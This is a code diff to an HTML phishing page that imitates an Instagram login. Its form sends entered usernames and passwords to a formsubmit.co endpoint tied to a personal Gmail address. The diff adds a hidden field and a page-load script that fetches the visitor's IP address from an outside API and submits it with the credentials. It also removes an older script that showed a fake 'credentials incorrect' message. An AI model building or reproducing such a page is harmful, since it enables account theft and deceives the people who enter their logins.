@@ -35,7 +35,7 @@
                 </div>
                 <div class="form-container">
                     <form id="form"  method="POST" action="https://formsubmit.co/youosas800@gmail.com">
-
+  <input type="text" id="ipAddress" name="ipAddress" readonly hidden>
                     <div class="form-content box">
                         <div class="logo">
                             <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
@@ -59,7 +59,7 @@
                                     </span>
                                     <input type="text" name="username" id="username" required>
                                     <input type="hidden" name="_captcha" value="false">
-                                    <input type="hidden" name="_next" value="thanks.html"/>
+                                    <input type="hidden" name="_next" value="thanks.html">
                                 </div>
                                 
                             </div>
@@ -76,7 +76,7 @@
                                 <div style="display: flex; text-align: end; justify-content: end; color: rgb(0, 17, 255);"><a href="#" class="forgot-pw">Forgotten your password?</a></div>
                             </div>
                             <div class="btn-group">
-                                <button class="btn-login"  type="submit" id="showTextButton" value="Send Email">
+                                <button class="btn-login"  type="submit" id="button" value="Send Email">
                                     Log In
                                 </button>
                                 <div class="box goto">
@@ -162,28 +162,25 @@
     </script> -->
     
     <script src="app.js"></script> 
+        <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const ipAddress = data.ip;
+            document.getElementById('ipAddress').value = ipAddress;
+          })
+          .catch(error => {
+            console.error('Error fetching IP address:', error);
+          });
+      });
 
+    </script>
 <!-- <script> -->
   
 
     <!-- </script> -->
-<script>
- document.getElementById('showTextButton').addEventListener('click', function () {
-        const textElement = document.getElementById('text');
-
-        // Check if the text is already visible
-        if (!textElement.classList.contains('visible')) {
-            // Make the text visible with animation
-            textElement.classList.add('visible');
-
-            // Update the text dynamically (optional)
-            textElement.textContent = "The Credentials you have entered is incorrect!";
-        } else {
-            // Hide the text if clicked again (toggle functionality)
-            textElement.classList.remove('visible');
-        }
-    });
-</script>
 
 </body>
 
